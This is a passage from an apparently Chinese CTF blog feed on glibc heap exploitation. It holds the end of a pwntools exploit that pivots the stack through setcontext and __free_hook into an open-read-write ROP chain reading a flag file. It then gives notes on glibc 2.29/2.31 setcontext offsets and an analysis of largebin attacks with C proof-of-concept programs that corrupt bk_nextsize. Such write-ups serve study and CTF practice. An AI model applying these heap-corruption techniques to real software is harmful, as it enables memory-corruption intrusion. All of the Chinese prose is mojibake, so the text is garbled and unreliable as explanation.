class="hljs-number">0x3060</span><br><br>stack_pivot_1 = heap_base + <span class="hljs-number">0x2000</span><br>stack_pivot_2 = heap_base + <span class="hljs-number">0x20A0</span><br><span class="hljs-comment">#æ§åˆ¶eneryæ•°ç»„çš„å€¼</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">8</span>    <br>payload += p64(free_hook)  <span class="hljs-comment"># 0x20</span><br>payload += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#30</span><br>payload += p64(flag_addr) <span class="hljs-comment">#40</span><br>payload += p64(stack_pivot_1) <span class="hljs-comment">#50</span><br>payload += p64(stack_pivot_2) <span class="hljs-comment">#60</span><br>payload += p64(orw1) <span class="hljs-comment">#70</span><br>payload += p64(orw2) <span class="hljs-comment">#80</span><br><br>edit(payload)<br>lss(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;syscall&#x27;</span>)<br><br><span class="hljs-comment"># Open</span><br><br>orw = p64(pop_rdi) + p64(flag_addr)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>orw += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>orw += p64(syscall)<br><br><span class="hljs-comment"># Read</span><br><br>orw += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi) + p64(orw1)<br>orw += p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>orw += p64(read)<br><br><span class="hljs-comment"># Write</span><br><br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>orw += p64(write)<br><br>add(<span class="hljs-number">0x18</span>)<br><br>edit(p64(setcontext))<br><br>add(<span class="hljs-number">0x38</span>)<br>edit(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br><br>pause()<br>add(<span class="hljs-number">0x68</span>)<br>edit(orw[:<span class="hljs-number">0x60</span>])<br><span class="hljs-comment"># orw1</span><br>add(<span class="hljs-number">0x78</span>)<br>edit(orw[<span class="hljs-number">0x60</span>:])<br><span class="hljs-comment"># orw2</span><br><br>add(<span class="hljs-number">0x58</span>)<br><span class="hljs-comment"># stack_pivot_2</span><br>edit(p64(orw1) + p64(ret))<br>add(<span class="hljs-number">0x48</span>)<br><span class="hljs-comment"># # stack_pivot_1</span><br>free()<br><br>p.interactive()<br><br><br><br></code></pre></td></tr></table></figure><h2 id="è¡¥å……è¯´æ˜"><a href="#è¡¥å……è¯´æ˜" class="headerlink" title="è¡¥å……è¯´æ˜"></a>è¡¥å……è¯´æ˜</h2><p>å‰é¢ç”±äºä¹‹å­¦äº†è€ç‰ˆæœ¬ï¼Œå‘ç°è¿˜æ˜¯ä¸å¤Ÿç”¨ï¼Œç°åœ¨åˆ†æè®°å½•ä¸€ä¸‹æ–°ç‰ˆæœ¬</p><h2 id="glibc2-29ç‰ˆæœ¬åŠå…¶ä»¥å‰"><a href="#glibc2-29ç‰ˆæœ¬åŠå…¶ä»¥å‰" class="headerlink" title="glibc2.29ç‰ˆæœ¬åŠå…¶ä»¥å‰"></a>glibc2.29ç‰ˆæœ¬åŠå…¶ä»¥å‰</h2><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412102020743.png" alt="image-20241210202044655"></p><p>setcontextçš„å˜åŒ–ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹glibc-2.29ï¼Œå¯ä»¥çœ‹åˆ°ç”±åŸæ¥çš„rdi + åç§»æ”¹æˆäº† <strong>rdx + åç§»</strong> ï¼Œç›´æ¥è¦†ç›–free_hookä¸ºsetcontextæ— æ³•å®Œæˆèµ‹å€¼</p><p>è¿™é‡Œéœ€è¦ä¸­è½¬ï¼Œå…ˆç”¨rdiç»™rdxèµ‹å€¼ï¼Œå†åˆ©ç”¨setcontextï¼Œä½†æ˜¯free_hookåªæœ‰ä¸€æ¬¡å†™çš„æœºä¼šï¼Œæ‰€ä»¥å†™å…¥çš„gadgetå¿…é¡»åŒæ—¶å®Œæˆè¿™ä¸¤ä¸ªæ“ä½œ &#x3D;&#x3D;&gt; 1. å…ˆç”¨rdiç»™rdxèµ‹å€¼ 2. è°ƒç”¨setcontext+53</p><p>è¿™é‡Œä»‹ç»å‡ ä¸ªæœ‰ç”¨çš„gadgetï¼Œç”¨æ¥è¦†ç›–free_hookï¼Œå®ç°æ ˆè¿ç§»ï¼š</p><p>æœç´¢å‘½ä»¤ï¼šROPgadget â€“binary libc-2.31.so â€“only â€œmov|callâ€ | grep -E â€œ: mov rdx, qword ptr [rdiâ€</p><h2 id="glibc2-31ç‰ˆæœ¬"><a href="#glibc2-31ç‰ˆæœ¬" class="headerlink" title="glibc2.31ç‰ˆæœ¬"></a>glibc2.31ç‰ˆæœ¬</h2><p>å’Œä¹‹å‰ç‰ˆæœ¬çš„åŒºåˆ«æ˜¯setcontext çš„ä½ç½®å˜æˆäº† setcontext+61</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412112044544.png" alt="image-20241211204422473"></p>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>setcontextæ‰“orw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºé«˜ä½ç‰ˆæœ¬çš„largebin attackæ”»å‡»</title>
    <link href="/2024/11/06/%E5%85%B3%E4%BA%8E%E9%AB%98%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84largebin-attack%E6%94%BB%E5%87%BB/"/>
    <url>/2024/11/06/%E5%85%B3%E4%BA%8E%E9%AB%98%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84largebin-attack%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºé«˜ä½ç‰ˆæœ¬çš„largebin-attackæ”»å‡»"><a href="#å…³äºé«˜ä½ç‰ˆæœ¬çš„largebin-attackæ”»å‡»" class="headerlink" title="å…³äºé«˜ä½ç‰ˆæœ¬çš„largebin attackæ”»å‡»"></a>å…³äºé«˜ä½ç‰ˆæœ¬çš„largebin attackæ”»å‡»</h1><h2 id="ä½ç‰ˆæœ¬largebin-arrackæ”»å‡»"><a href="#ä½ç‰ˆæœ¬largebin-arrackæ”»å‡»" class="headerlink" title="ä½ç‰ˆæœ¬largebin arrackæ”»å‡»"></a>ä½ç‰ˆæœ¬largebin arrackæ”»å‡»</h2><p>æ­¤å¤„é€‚ç”¨çš„ç‰ˆæœ¬ä¸º2.23~2.30</p><p>ä¸‹é¢æ˜¯å¯¹glibc2.23æºç çš„åˆ†æï¼ˆç”±äºè‡ªå·±ç”»ä¸å‡ºè¿™ç§æ•ˆæœå€Ÿé‰´äº†å¤§ä½¬çš„å›¾)</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411062011549.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é€»è¾‘è¿˜æ˜¯éå¸¸æ¸…æ™°çš„æˆ‘æŠŠå®ƒç®€å•åˆ†ä¸ºä¸€ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š</p><ol><li>ä»unsorted biné“¾ä¸­å–å‡ºçš„chunkå¤§å°ï¼Œæ˜¯å¦å±äºsmall binçš„å¤§å°<ul><li>small binç›¸å…³çš„å¤„ç†</li></ul></li><li>ä»unsorted biné“¾ä¸­å–å‡ºçš„chunkå¤§å°ï¼Œæ˜¯å¦å±äºlarge binçš„å¤§å°<ul><li>è®¡ç®—å‡ºå½“å‰chunkå¤§å°ä»å±çš„main_arean-&gt;binsçš„ä¸‹æ ‡</li><li>è·å–è¯¥binsä¸‹æ ‡çš„large binçš„å¤´ç»“ç‚¹ <code>bck</code></li><li>é€šè¿‡large binå¤´èŠ‚ç‚¹çš„fdï¼Œæ‰¾åˆ°large biné“¾ä¸­sizeæœ€å¤§çš„chunk <code>fwd</code>ï¼ˆlarge biné“¾ä¸­ç¬¬ä¸€ä¸ªchunkï¼‰</li><li>å½“å‰large biné“¾ä¸ä¸ºç©ºï¼ˆæ“ä½œçš„æ˜¯fd_nextsizeå’Œbk_nextsizeå½¢æˆçš„é“¾ï¼‰<ul><li>å½“å‰chunkçš„size &lt; large biné“¾ä¸­æœ€å°çš„chunk<ul><li>ï¼ˆ<code>æ€»ç»“ï¼šå°†å½“å‰chunkæ’å…¥åˆ°large biné“¾çš„å°¾éƒ¨ï¼Œå³æ’å…¥åˆ°æœ€å°çš„chunkçš„åé¢</code>ï¼‰</li><li><code>fwd = bck;</code> ä»¤ fwd æŒ‡å‘ large bin å¤´ç»“ç‚¹</li><li><code>bck = bck-&gt;bk;</code> ä»¤ bck æŒ‡å‘ largin bin å°¾éƒ¨ chunkï¼Œå°±æ˜¯å½“å‰å·²åœ¨large biné“¾ä¸­æœ€å°çš„è¿™ä¸ªchunk</li><li><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> å½“å‰chunk çš„ fd_nextsize æŒ‡å‘ largin bin çš„ç¬¬ä¸€ä¸ª chunk</li><li><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</code> å½“å‰chunkçš„ bk_nextsize æŒ‡å‘åŸæ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ª chunk æŒ‡å‘çš„ bk_nextsizeï¼ˆå½“å‰chunkçš„bk_nextsizeæŒ‡å‘åŸå…ˆæœ€å°çš„chunkï¼‰</li><li>fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;<ul><li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> åŸå…ˆæœ€å°chunkçš„fd_nextsizeæŒ‡å‘å½“å‰chunk</li><li><code>fwd-&gt;fd-&gt;bk_nextsize = victim</code> large binä¸­ç¬¬ä¸€ä¸ªchunkçš„bk_nextsizeæŒ‡å‘å½“å‰chunk</li></ul></li></ul></li><li>å½“å‰chunkçš„size &gt;&#x3D; large biné“¾ä¸­æœ€å°çš„chunk<ul><li>ä»large biné“¾ä¸­sizeæœ€å¤§çš„chunk <code>fwd</code>ï¼ˆlarge biné“¾ä¸­ç¬¬ä¸€ä¸ªchunkï¼‰ï¼Œä»å¤§åˆ°å°éå†ï¼Œæ‰¾åˆ°é¦–ä¸ªä¸å¤§äºå½“å‰chunkçš„chunk</li><li>å¦‚æœæ‰¾åˆ°çš„chunkçš„å¤§å° <code>=</code> å½“å‰chunk<ul><li><code>fwd = fwd-&gt;fd;</code>å°†å½“å‰chunk æ’å…¥åˆ°è¯¥chunkçš„åé¢ï¼Œå¹¶ä¸ä¿®æ”¹ nextsize æŒ‡é’ˆ</li></ul></li><li>å¦‚æœæ‰¾åˆ°çš„chunkçš„å¤§å° <code>&lt;</code> å½“å‰chunk<ul><li><code>victim-&gt;fd_nextsize = fwd;</code> å½“å‰chunkçš„fd_nextsizeæŒ‡å‘è¿™ä¸ªæ‰¾åˆ°çš„chunk</li><li><code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</code> å½“å‰chunkçš„bk_nextsizeæŒ‡å‘è¿™ä¸ªæ‰¾åˆ°çš„chunkçš„bk_nextsize</li><li><code>fwd-&gt;bk_nextsize = victim;</code> æ‰¾åˆ°chunkçš„bk_nextsizeæŒ‡å‘å½“å‰chunk</li><li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> æ‰¾åˆ°chunkåŸå…ˆå‰é¢çš„chunkçš„fd_nextsizeæŒ‡å‘å½“å‰chunk</li></ul></li><li>è·å–æ‰¾åˆ°çš„chunkçš„å‰é¢çš„ä¸€ä¸ªchunkï¼ˆé€šè¿‡bkæ‰¾åˆ°å½“å‰chunkæ’å…¥å‰ï¼Œæœ€å°çš„æ¯”æ‰¾åˆ°çš„chunkå¤§çš„chunkï¼‰</li></ul></li></ul></li><li>å½“å‰large biné“¾ä¸ºç©ºï¼ˆæ“ä½œçš„æ˜¯fd_nextsizeå’Œbk_nextsizeå½¢æˆçš„é“¾ï¼‰<ul><li>å½“å‰chunkçš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>å‡æŒ‡å‘è‡ªå·±</li></ul></li></ul></li><li>å°†å½“å‰chunké“¾å…¥large biné“¾ä¸­ï¼ˆ<code>fd,bkå½¢æˆçš„é“¾</code>ï¼‰</li></ol><p>ä¸‹é¢<code>é€šè¿‡è¢«ç ´åçš„large bin chunkå®ç°æ¼æ´åˆ©ç”¨</code>çš„è§’åº¦æ¥è§‚å¯Ÿä¸åŒå…¥é“¾çš„é€»è¾‘ï¼ˆ<code>ä¸€èˆ¬æ˜¯å †æº¢å‡ºä¿®æ”¹large binçš„fd,bk,fd_nextsize,bk_nextsize</code>ï¼‰</p><h3 id="1ï¼‰é¦–ä¸ªchunkå…¥large-biné“¾"><a href="#1ï¼‰é¦–ä¸ªchunkå…¥large-biné“¾" class="headerlink" title="1ï¼‰é¦–ä¸ªchunkå…¥large biné“¾"></a>1ï¼‰é¦–ä¸ªchunkå…¥large biné“¾</h3><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411062151362.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>æ­¤æ—¶è¿˜æ²¡æœ‰è¢«ç ´åçš„chunk</li><li>large bin fdï¼Œlarge bin bk æŒ‡å‘è¿™ä¸ªchunkçš„é¦–åœ°å€</li><li>chunkçš„fd,bkæŒ‡å‘large bin å¤´ç»“ç‚¹çš„é¦–åœ°å€</li><li>fd_nextsizeï¼Œbk_nextsizeæŒ‡å‘chunkè‡ªèº«</li></ul><h3 id="2ï¼‰æ¯”æœ€å°çš„chunkè¿˜å°çš„chunkå…¥large-biné“¾"><a href="#2ï¼‰æ¯”æœ€å°çš„chunkè¿˜å°çš„chunkå…¥large-biné“¾" class="headerlink" title="2ï¼‰æ¯”æœ€å°çš„chunkè¿˜å°çš„chunkå…¥large biné“¾"></a>2ï¼‰æ¯”æœ€å°çš„chunkè¿˜å°çš„chunkå…¥large biné“¾</h3><p>å…ˆçœ‹çœ‹è¯¥å…¥é“¾é€»è¾‘æ‰€æ¶‰åŠçš„ä»£ç ï¼Œ<code>å¯»æ‰¾å¯è¢«ç ´å-ç”¨äºåˆ©ç”¨çš„chunk(ä»è€Œæœ‰å †æº¢å‡ºäº§ç”Ÿæ—¶ï¼Œæ„é€ è¿™ç§å †ç»“æ„)</code>ï¼Œ<code>ä»¥åŠåˆ©ç”¨æ–¹å¼</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);ã€<span class="hljs-number">1</span>ã€‘<br>    fwd = bck-&gt;fd;ã€<span class="hljs-number">2</span>ã€‘<br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>          &#123;<br>            fwd = bck;  ã€<span class="hljs-number">3</span>ã€‘<br>            bck = bck-&gt;bk;  ã€<span class="hljs-number">4</span>ã€‘<br><br>            victim-&gt;fd_nextsize = fwd-&gt;fd; ã€<span class="hljs-number">5</span>ã€‘<br>            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;ã€<span class="hljs-number">6</span>ã€‘<br>            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;ã€<span class="hljs-number">7</span>ã€‘<br>          &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;ã€<span class="hljs-number">8</span>ã€‘<br>victim-&gt;fd = fwd;ã€<span class="hljs-number">9</span>ã€‘<br>fwd-&gt;bk = victim;ã€<span class="hljs-number">10</span>ã€‘<br>bck-&gt;fd = victim;ã€<span class="hljs-number">11</span>ã€‘<br></code></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ä¸»è¦åœ¨äºã€6ã€‘ã€7ã€‘ï¼Œä¸‹é¢åˆ†æä¸€ä¸‹æ¼æ´åŸç†</p><p><strong>victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;</strong></p><p>é€šè¿‡ä¿®æ”¹åŸå…ˆæœ€å°largebinçš„bk_nextsizeä½¿å¾—è¢«é“¾å…¥çš„chunkçš„bk_nextsizeä¹Ÿè¢«ç¯¡æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071441038.png" alt="image-20241107144156977"></p><p><strong>fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;</strong></p><p>åˆ†å¼€ç ”ç©¶å…¶ä¸­ <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>æŠŠç¯¡æ”¹çš„BK_NSçš„fdä¿®æ”¹ä¸ºvictimçš„é¦–åœ°å€ï¼Œ<code>fwd-&gt;fd-&gt;bk_nextsize= victim</code>æŠŠbck-&gt;bk_nsçš„å€¼ä¿®æ”¹ä¸ºvictimçš„é¦–åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071446046.png" alt="image-20241107144630988"></p><p>ã€8ã€‘ï¼Œã€9ã€‘ï¼Œã€10ã€‘ï¼Œã€11ã€‘éƒ½æ˜¯ä¸èƒ½æ§åˆ¶çš„</p><p>ä¸‹é¢æ˜¯ç›¸å…³ä»£ç ï¼Œå¯ä»¥è‡ªå·±è°ƒè¯•çœ‹çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// OK</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin test\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>); <span class="hljs-comment">//largebin</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//to separate</span><br><br>    <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>); <span class="hljs-comment">//unsortedbin</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//to separate</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>); <span class="hljs-comment">//Release p1 into largebin</span><br>    <span class="hljs-built_in">free</span>(p2);  <span class="hljs-comment">//Release p2 into unsortedbin</span><br><br>    p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var <span class="hljs-number">-4</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// OK</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin test\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-type">size_t</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-built_in">free</span>(p3);<br><br>    p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var <span class="hljs-number">-4</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3ï¼‰æ”¾å…¥ç›¸åŒå¤§å°çš„-chunk"><a href="#3ï¼‰æ”¾å…¥ç›¸åŒå¤§å°çš„-chunk" class="headerlink" title="3ï¼‰æ”¾å…¥ç›¸åŒå¤§å°çš„ chunk"></a>3ï¼‰æ”¾å…¥ç›¸åŒå¤§å°çš„ chunk</h3><p>æ‰€æ¶‰åŠçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);ã€<span class="hljs-number">1</span>ã€‘<br>    fwd = bck-&gt;fd;ã€<span class="hljs-number">2</span>ã€‘<br><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        size |= PREV_INUSE;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>          &#123;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))ã€<span class="hljs-number">3</span>ã€‘<br>              &#123;<br>                fwd = fwd-&gt;fd_nextsize;<br>              &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>              <span class="hljs-comment">/* Always insert in the second position.  */</span><br>              fwd = fwd-&gt;fd;ã€<span class="hljs-number">4</span>ã€‘<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>              &#125;<br>            bck = fwd-&gt;bk;ã€<span class="hljs-number">5</span>ã€‘<br>          &#125;<br>      &#125;<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;ã€<span class="hljs-number">6</span>ã€‘<br>victim-&gt;fd = fwd;ã€<span class="hljs-number">7</span>ã€‘<br>fwd-&gt;bk = victim;ã€<span class="hljs-number">8</span>ã€‘<br>bck-&gt;fd = victim;ã€<span class="hljs-number">9</span>ã€‘<br></code></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ä¸»è¦åœ¨ã€4ã€‘ã€5ã€‘ï¼Œä¸‹é¢è¿›è¡Œæ¼æ´åŸç†åˆ†æ</p><p>å¦‚æœfwdå’Œvictimå¤§å°ç›¸ç­‰ï¼Œå°±ä¼šæŠŠfwdä¸­çš„fdå–å‡ºæ¥ç”¨ï¼Œä»ä¸Šå›¾å¯ä»¥å¯ä»¥æƒ³åˆ°ï¼Œå‡è®¾å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œé‚£å°±å¯ä»¥ä¿®æ”¹fwd-&gt;fdï¼Œ bck &#x3D; fwd-&gt;bkè¿™æ¡å¤„ç†ä¼šæŠŠä¼ªé€ çš„fwdçš„bkå–å‡ºä½œä¸ºbckï¼Œä¼ªé€ çš„fwd chunkçš„bkå­—æ®µå¿…é¡»æ˜¯è¦æœ‰å†…å®¹çš„ï¼Œæœ€å¥½æ˜¯ä¸ªå¯å†™å†…å­˜çš„åœ°å€ï¼Œå¦åˆ™æ‰§è¡Œã€9ã€‘æ—¶ç¨‹åºä¼šå´©æºƒã€‚ç„¶åfwd-&gt;bk &#x3D; victimè¿™æ¡å¤„ç†å°±ä¼šåœ¨ä¼ªé€ çš„fwd-&gt;bkä¸Šå†™å…¥victimçš„é¦–åœ°å€ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071501863.png" alt="image-20241107150123801"></p><h3 id="4ï¼‰æ”¾å…¥ä¸å’Œå…¶ä»–chunk-sizeç›¸ç­‰ï¼Œä¸”ä¸æ˜¯æœ€å°çš„chunk"><a href="#4ï¼‰æ”¾å…¥ä¸å’Œå…¶ä»–chunk-sizeç›¸ç­‰ï¼Œä¸”ä¸æ˜¯æœ€å°çš„chunk" class="headerlink" title="4ï¼‰æ”¾å…¥ä¸å’Œå…¶ä»–chunk sizeç›¸ç­‰ï¼Œä¸”ä¸æ˜¯æœ€å°çš„chunk"></a>4ï¼‰æ”¾å…¥ä¸å’Œå…¶ä»–chunk sizeç›¸ç­‰ï¼Œä¸”ä¸æ˜¯æœ€å°çš„chunk</h3><p>æ‰€æ¶‰åŠçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);ã€<span class="hljs-number">1</span>ã€‘<br>    fwd = bck-&gt;fd;ã€<span class="hljs-number">2</span>ã€‘<br><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        size |= PREV_INUSE;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>          &#123;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span 